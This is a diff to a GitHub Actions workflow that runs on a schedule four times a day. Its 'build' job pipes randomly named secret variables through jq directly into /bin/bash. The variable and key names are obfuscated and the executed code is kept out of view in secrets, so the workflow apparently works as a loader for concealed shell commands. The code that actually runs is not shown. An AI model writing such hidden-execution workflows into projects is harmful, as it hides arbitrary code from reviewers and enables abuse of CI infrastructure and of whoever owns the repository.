@@ -3,7 +3,8 @@ name: maxiaoyu1827
 on:
   workflow_dispatch:
   schedule:
-    - cron: '33 5/6 * * *'
+    - cron: '41 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,13 +12,24 @@ jobs:
       - uses: actions/checkout@v4
       - name: maxiaoyu1827
         env:
-          tzv7: ${{ secrets.tzv7 }}
+          vim59898: ${{ secrets.vim59898 }}
         run: |
-          echo $tzv7 | jq -r .tkukd338 | /bin/bash
-          echo $xa275 | jq -r .mb093 | /bin/bash
-          echo $z8887 | jq -r .pztys7 | /bin/bash
-          echo $kndqw3 | jq -r .lteu200 | /bin/bash
-          echo $l69 | jq -r .glqk287 | /bin/bash
-          echo $mhji7 | jq -r .n5034 | /bin/bash
-          echo $qzoig8716 | jq -r .ccxke4 | /bin/bash
+          echo $vim59898 | jq -r .r62935 | /bin/bash
+          echo $ggj7 | jq -r .q4 | /bin/bash
+          echo $lce299 | jq -r .sbjkg718 | /bin/bash
+          echo $qkq9474 | jq -r .t729 | /bin/bash
+          echo $plq784 | jq -r .v76 | /bin/bash
+          echo $su143 | jq -r .dgx1756 | /bin/bash
+          echo $nfghi85 | jq -r .o4 | /bin/bash
+          echo $si2 | jq -r .in309 | /bin/bash
+          echo $uqp5 | jq -r .rnq764 | /bin/bash
+          echo $h40 | jq -r .t481 | /bin/bash
+          echo $vj729 | jq -r .o1 | /bin/bash
+          echo $w18 | jq -r .ibzw61735 | /bin/bash
+          echo $wnlsw9 | jq -r .sii584 | /bin/bash
+          echo $lulzj343 | jq -r .of776 | /bin/bash
+          echo $caweb2 | jq -r .ny0 | /bin/bash
+          echo $diqz29386 | jq -r .pr5827 | /bin/bash
+          echo $zlst79 | jq -r .vti478 | /bin/bash
+          echo $lc08 | jq -r .ibjzt56 | /bin/bash
 
